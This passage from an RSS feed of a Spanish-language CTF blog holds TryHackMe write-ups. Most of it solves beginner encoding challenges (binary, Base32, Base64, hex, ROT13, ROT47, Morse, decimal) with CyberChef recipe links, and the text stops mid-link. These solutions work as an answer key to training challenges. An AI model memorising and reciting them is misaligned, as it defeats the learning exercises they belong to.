&lt;p&gt;&lt;a href=&#34;https://www.rapidtables.com/convert/number/hex-to-ascii.html&#34;&gt;&lt;strong&gt;Hex &amp;gt; Text&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004930.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-18&#34;&gt;Easter 18&lt;/h2&gt;
&lt;p&gt;Enviamos en los headers &lt;code&gt;egg: Yes&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_011431.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_011524.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-19&#34;&gt;Easter 19&lt;/h2&gt;
&lt;p&gt;Vemos una imagen.webp que no se muestra en la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010831.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010916.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-20&#34;&gt;Easter 20&lt;/h2&gt;
&lt;p&gt;En este reto nos muestran un usuario y contraseña las cuales debemos de enviar por el metodo POST, en la pagina principal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005017.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005135.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/ctf_collection_vol2/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/ctf_collection_vol2/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - c4ptur3-th3-fl4g</title>
        <link>https://sckull.github.io/posts/c4ptur3-th3-fl4g/</link>
        <pubDate>Wed, 12 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/c4ptur3-th3-fl4g/</guid>
        <description>C4ptur3-th3-fl4g es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.
 Informacion de la Maquina    Titulo c4ptur3-th3-fl4g     Info A beginner level CTF challenge   Puntos 4565   Dificultad Facil   Maker dcdavidlee    Hashes Algunas paginas con las cuales podemos analizar el hash y resolver los retos en linea.</description>
        <content:encoded>&lt;p&gt;C4ptur3-th3-fl4g es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/c4ptur3th3fl4g/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;c4ptur3-th3-fl4g&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A beginner level CTF challenge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;4565&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/dcdavidlee&#34;&gt;dcdavidlee&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;hashes&#34;&gt;Hashes&lt;/h2&gt;
&lt;p&gt;Algunas paginas con las cuales podemos analizar el hash y resolver los retos en linea.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.onlinehashcrack.com/hash-identification.php&#34;&gt;&lt;strong&gt;Hash Identification&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.tunnelsup.com/hash-analyzer/&#34;&gt;&lt;strong&gt;Hash Analyzer&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;translation--shifting&#34;&gt;Translation &amp;amp; Shifting &lt;/h2&gt;
&lt;h3 id=&#34;1-l33t-o-adivinando-el-mensaje&#34;&gt;#1 L33t o adivinando el mensaje.&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;br /&gt;
c4n y0u c4p7u23 7h3 f149?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
can you capture the flag?&lt;/p&gt;
&lt;h3 id=&#34;2-from-binary&#34;&gt;#2 From Binary&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 
00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 
01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 
00100001
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Binary(&#39;Space&#39;)&amp;amp;input=MDExMDExMDAgMDExMDAxMDEgMDExMTAxMDAgMDExMTAwMTEgMDAxMDAwMDAgMDExMTAxMDAgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMTAwMTEgMDExMDExMTEgMDExMDExMDEgMDExMDAxMDEgMDAxMDAwMDAgMDExMDAwMTAgMDExMDEwMDEgMDExMDExMTAgMDExMDAwMDEgMDExMTAwMTAgMDExMTEwMDEgMDAxMDAwMDAgMDExMDExMTEgMDExMTAxMDEgMDExMTAxMDAgMDAxMDAwMDE
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;3-base32&#34;&gt;#3 Base32&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,false)&amp;amp;input=TUpRWEdaSlRHSVFHUzRaQU9OMlhBWkxTRUJSVzYzTE5ONVhDQTJMT0VCQlZJUlJIT009PT09PT0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4-base64&#34;&gt;#4 Base64&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)&amp;amp;input=UldGamFDQkNZWE5sTmpRZ1pHbG5hWFFnY21Wd2NtVnpaVzUwY3lCbGVHRmpkR3g1SURZZ1ltbDBjeUJ2WmlCa1lYUmhMZz09
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5-hex&#34;&gt;#5 Hex&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Hex(&#39;Space&#39;)&amp;amp;input=NjggNjUgNzggNjEgNjQgNjUgNjMgNjkgNmQgNjEgNmMgMjAgNmYgNzIgMjAgNjIgNjEgNzMgNjUgMzEgMzYgM2Y
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;6-caesar-cipher&#34;&gt;#6 Caesar Cipher&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ebgngr zr 13 cynprf!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/c4ptur3th3fl4g/Screenshot_20200206_002513.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cryptii.com/pipes/caesar-cipher&#34;&gt;&lt;strong&gt;Decoder - Caesar Cipher&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;7-rot47&#34;&gt;#7 Rot47&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*@F DA:? &amp;gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:&amp;gt;6DX
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=ROT47(47)&amp;amp;input=KkBGIERBOj8gPjYgQzo4OUUgQ0BGPzUgMzIzSiBDOjg5RSBDQEY/NSBXY2YgRTo%2BNkRY
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;8-morse-code&#34;&gt;#8 Morse Code&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -.

. -. -.-. --- -.. .. -. --.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&#39;Space&#39;,&#39;Line%20feed&#39;)&amp;amp;input=LSAuIC4tLi4gLiAtLi0uIC0tLSAtLSAtLSAuLi0gLS4gLi4gLS4tLiAuLSAtIC4uIC0tLSAtLgoKLiAtLiAtLi0uIC0tLSAtLi4gLi4gLS4gLS0u
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;9-decimal&#34;&gt;#9 Decimal&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;85 110 112 97 99 107 32 116 104 105 115 32 66 67 68
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;amp;input=ODUgMTEwIDExMiA5NyA5OSAxMDcgMzIgMTE2IDEwNCAxMDUgMTE1IDMyIDY2IDY3IDY4
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;10-base64--morse-code--binary--rot47--decimal&#34;&gt;#10 Base64 &amp;gt; Morse Code &amp;gt; Binary &amp;gt; Rot47 &amp;gt; Decimal&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Morse_Code(&#39;Space&#39;,&#39;Line%20feed&#39;)From_Binary(&#39;Space&#39;)ROT47(47)From_Decimal(&#39;Space&#39;,false)&amp;amp;input=TFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMw